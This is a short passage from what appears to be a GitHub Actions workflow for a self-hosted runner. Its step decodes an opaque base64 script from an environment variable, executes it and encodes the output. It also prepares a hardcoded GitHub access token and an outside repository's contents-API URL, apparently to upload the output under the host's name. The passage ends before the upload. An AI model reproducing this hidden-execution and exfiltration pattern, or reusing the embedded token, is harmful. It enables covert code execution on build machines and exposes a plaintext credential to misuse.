    runs-on: [self-hosted, ul-l40s]
    timeout-minutes: 20
    steps:
      - name: run
        run: |
          echo "$B64" | base64 -d > /tmp/rp7.sh
          bash /tmp/rp7.sh 2>&1 | tee /tmp/rp7.out
          H=$(hostname -s); C=$(base64 -w0 /tmp/rp7.out)
          T=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; P="cmdout8/ul-t2-rp7_${H}.txt"; B=https://api.github.com/repos/dongsuju/ul-plant/contents/$P
